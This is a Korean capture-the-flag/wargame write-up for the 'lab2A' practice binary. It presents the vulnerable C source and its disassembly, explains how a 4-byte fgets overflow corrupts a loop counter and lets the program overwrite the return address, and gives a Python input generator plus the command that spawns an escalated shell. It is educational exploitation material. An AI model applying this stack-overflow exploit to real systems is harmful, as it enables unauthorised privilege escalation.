## 1. 문제 확인
- ID : lab2A
- Target : /level/lab02/lab2A
- flag : /home/lab2end/.pass
```
	lab2A@warzone:/levels/lab02$ ./lab2A
	Input 10 words:
	1234567890
	abcdefg
	1111111111
	2222222222
	3333333333
	4444444444
	5555555555
	6666666666
	7777777777
	8888888888
	Here are the first characters from the 10 words concatenated:
	1a12345678
	Not authenticated
	lab2A@warzone:/levels/lab02$
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
```c
	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>

	/*
 	* compiled with:
 	* gcc -O0 -fno-stack-protector lab2A.c -o lab2A
 	*/

	void shell()
	{
        printf("You got it\n");
        system("/bin/sh");
	}

	void concatenate_first_chars()
	{
        struct {
            char word_buf[12];
            int i;
            char* cat_pointer;
            char cat_buf[10];
    	} locals;
    	locals.cat_pointer = locals.cat_buf;

    	printf("Input 10 words:\n");
    	for(locals.i=0; locals.i!=10; locals.i++)
    	{
        	// Read from stdin
        	if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
        	{
            	printf("Failed to read word\n");
            	return;
        	}
        	// Copy first char from word to next location in concatenated buffer
        	*locals.cat_pointer = *locals.word_buf;
        	locals.cat_pointer++;
    	}

    	// Even if something goes wrong, there's a null byte here
    	//   preventing buffer overflows
    	locals.cat_buf[10] = '\0';
    	printf("Here are the first characters from the 10 words concatenated:\n\%s\n", locals.cat_buf);
	}

	int main(int argc, char** argv)
	{
        if(argc != 1)
        {
            printf("usage:\n%s\n", argv[0]);
            return EXIT_FAILURE;
        }

        concatenate_first_chars();

        printf("Not authenticated\n");
        return EXIT_SUCCESS;
	}
```
### 2.2 Code 분석
#### 2.2.1 concatenate_first_chars()
- word_buf 크기가 12byte인데 fgets()함수에서 16byte(0x10)를 입력받을 수 있으므로 4byte overflow 발생 가능
```c
	...
    struct {
            char word_buf[12];
            int i;
            char* cat_pointer;
            char cat_buf[10];
    } locals;
    ...
    if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
    {
	...
```
- word_buf 가 overflow 되면 i 값까지 덮어쓰게 되고, i 값이 10이 아니면 for문이 반복되므로 최종적으로 cat_buf 의 크기인 10byte보다 더 큰 값을 덮어쓸 수 있음
```c
	...
	locals.cat_pointer = locals.cat_buf;

    printf("Input 10 words:\n");
	for(locals.i=0; locals.i!=10; locals.i++)
    {
    ...
    	*locals.cat_pointer = *locals.word_buf;
        locals.cat_pointer++;
    }
```
- fgets()함수를 통해 12byte 문자를 입력하면 Enter(0xa)까지 총 13byte가 word_buf 에 쓰여지고 다음 변수 i 까지 덮어쓰게 됨
  (※ i값이 0xa(10)부터 증가되므로 for문 조건에 의해 무한 반복됨)
```
	|-----------   word_buf  -----------| |---- i ----|
    [31 32 33 34 35 36 37 38 39 30 31 32] [0a 00 00 00]
      1  2  3  4  5  6  7  8  9  0  1  2   \n    
```
- for문을 반복하면서 word_buf 입력값의 첫 byte를 복사하여 cat_buf 에 순차적으로 붙여넣음
```
	...
    0x08048777 <+90>:    mov    eax,DWORD PTR [ebp-0x18]
    0x0804877a <+93>:    movzx  edx,BYTE PTR [ebp-0x28]
    0x0804877e <+97>:    mov    BYTE PTR [eax],dl
    0x08048780 <+99>:    mov    eax,DWORD PTR [ebp-0x18]
    0x08048783 <+102>:   add    eax,0x1
    0x08048786 <+105>:   mov    DWORD PTR [ebp-0x18],eax
    ...
```
- cat_buf 의 위치는 word_buf 위치(ebp-0x28)로부터 20byte(0x14) 떨어져 있으므로 ebp-0x14 가 되며 cat_buf 값이 20byte가 넘어가게 되면 SFP, RET 주소를 순차적으로 덮어쓰게 됨
```
  	0x0804871d <+0>:     push   ebp
  	0x0804871e <+1>:     mov    ebp,esp
   	0x08048720 <+3>:     sub    esp,0x38
   	0x08048723 <+6>:     lea    eax,[ebp-0x28]
   	0x08048726 <+9>:     add    eax,0x14
   	0x08048729 <+12>:    mov    DWORD PTR [ebp-0x18],eax
    ...
```

<br/><br/>
## 3. Exploit
- 변수 i 값을 변경하여 반복문 횟수를 늘리고 cat_buf 값이 리턴주소까지 덮어쓰도록 함 
```
	 =============================================>
    [word_buf][i][cat_pointer][cat_buf][dummy][SFP][RET]
        12     4       4          10      10    4  main() <-- shell() 주소로 변경
```
- 쉘을 띄워줄 shell()함수의 주소를 확인하여 리턴주소로 사용함
```
	gdb-peda$ p shell
	$2 = {<text variable, no debug info>} 0x80486fd <shell>
	gdb-peda$
```
- 다음 코드를 실행하여 입력 데이터를 생성함
```python
    print("a"*12)
    
    for i in range(23):
    	print("b")
        
    print("\xfd")
    print("\x86")
    print("\x04")
    print("\x08")
    
    print("")  // for문 강제 종료를 위한 입력
```
- 생성된 입력값을 전달하여 프로그램을 실행해주면 됨
  (※ 파이프는 cat 명령의 결과값만 전달하기 때문에 ;cat 명령을 추가하여 쉘이 input을 받을 수 있도록 해줘야 함)
```
	lab2A@warzone:/levels/lab02$ python /tmp/lab2a.py > /tmp/lab2a_input
	lab2A@warzone:/levels/lab02$ (cat /tmp/lab2a_input;cat) | ./lab2A
	Input 10 words:
	Failed to read word
	You got it
	id
	uid=1008(lab2A) gid=1009(lab2A) euid=1009(lab2end) groups=1010(lab2end),1001(gameuser),1009(lab2A)
```
